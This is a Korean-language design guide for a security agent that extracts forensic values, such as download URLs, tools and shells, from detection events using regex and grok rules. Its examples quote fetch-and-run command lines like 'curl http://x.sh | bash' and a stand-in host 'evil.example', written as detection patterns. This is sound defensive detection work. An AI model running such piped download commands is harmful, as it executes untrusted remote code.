# Agent Forensic Extraction Guide (v2)

## 1. 목적

본 문서는 Agent가 탐지 이벤트를 기반으로 포렌식 분석에 필요한 값을 추출하는 규칙을 정의한다.

본 문서의 범위는 다음과 같다.

- 어떤 이벤트 필드를 추출 대상으로 볼 것인가
- 어떤 방식으로 값을 추출할 것인가
- 추출 결과를 어떤 포렌식 분석기 입력값으로 전달할 것인가

---

## 2. 책임 범위

### Agent가 수행하는 것
- 탐지 이벤트 확인
- Link Meta 조회
- `forensicId` 선택
- `needForensicValue` 확인
- YAML 규칙 적용
- grok / regex 기반 값 추출
- 포렌식 payload 생성 및 전송

### Agent가 수행하지 않는 것
- 탐지 필터 자체의 탐지 판단 변경
- Backend / ETL 저장 구조 해석 위임

### Backend / ETL이 수행하는 것
- Agent가 전송한 결과 저장

---

## 3. 입력 구조

### 3.1 탐지 필터
탐지 필터에는 최소 정보만 존재한다.

```json
"forensic": {
  "isUse": true
}
```

### 3.2 Link Meta
탐지 ID별 Link Meta 파일에서 다음을 정의한다.

- `osVariant`
- `forensicId`
- `needForensicValue`

### 3.3 YAML 규칙
Agent는 `agent-forensic-rules.v2.yaml` 을 참조하여 실제 추출 규칙을 적용한다.

---

## 4. 추출 방식

Agent는 다음 두 가지 방식만 사용한다.

### 4.1 Regex
- 정규식 기반 값 추출
- 캡처 그룹 또는 named group 사용 가능
- 단일 필드에서 특정 값 추출에 적합

### 4.2 Grok
- 패턴 기반 구조화 추출
- Syslog / CommandLine / 로그 메시지 계열에 적합

---

## 5. 주요 추출 대상 필드

| 필드 | 설명 |
| --- | --- |
| `CommandLine` | 프로세스 실행 명령 전체 |
| `msg` | Syslog 메시지 |
| `Image` | 실행 파일 경로 |
| `ParentCommandLine` | 부모 프로세스 명령행 |
| `file_path` | 파일 경로 |

---

## 6. 기본 동작 흐름

1. 탐지 이벤트 수신
2. `forensic.isUse` 확인
3. 탐지 ID 기준 Link Meta 조회
4. 현재 호스트에 맞는 `osVariant` 선택
5. 해당 `forensicId` 확인
6. `needForensicValue=true` 이면 YAML 추출 규칙 적용
7. 추출 결과 정리 및 후처리
8. 포렌식 payload 생성
9. 서버 전송

---

## 7. YAML 규칙 설계 원칙

### 원칙 1. `forensicId` 기준으로 매핑한다
YAML 규칙은 특정 탐지 ID에 종속될 수도 있고,
특정 `forensicId` 에 공통 적용될 수도 있다.

### 원칙 2. false positive를 최소화한다
너무 넓은 정규식은 지양한다.

### 원칙 3. quoted / unquoted를 모두 고려한다
파일 경로나 URL은 따옴표 포함 여부가 달라질 수 있으므로 정규화가 필요하다.

### 원칙 4. 후처리는 최소화하되 일관되게 한다
예:
- trim
- lowercase
- strip_wrapping_quotes
- normalize_windows_path
- normalize_linux_path

---

## 8. 예시

### 8.1 Regex 예시

```regex
(?i)(https?:\/\/\S+\.sh)
```

의미:
- `.sh` 스크립트 다운로드 URL 추출

### 8.2 Grok 예시

```grok
%{WORD:download_tool} %{GREEDYDATA:prefix}%{URI:remote_url} \| %{WORD:exec_shell}
```

의미:
- `curl http://x.sh | bash`
- `wget http://x.sh | eval`
같은 문자열에서 도구, URL, 실행 쉘을 분리

---

## 9. 추출 결과 예시

```json
{
  "forensic": {
    "forensicId": "ws-integrated-malware-file-analyzer",
    "values": {
      "remote_url": "http://evil.example/a.sh",
      "download_tool": "curl",
      "exec_shell": "bash",
      "analysis_type": "remote_script",
      "artifact_origin": "network"
    }
  }
}
```

---

## 10. 결론

> Agent는 탐지 결과와 Link Meta를 확인하고, `agent-forensic-rules.v2.yaml` 규칙에 따라 필요한 값을 직접 추출하여 포렌식을 완성한다.
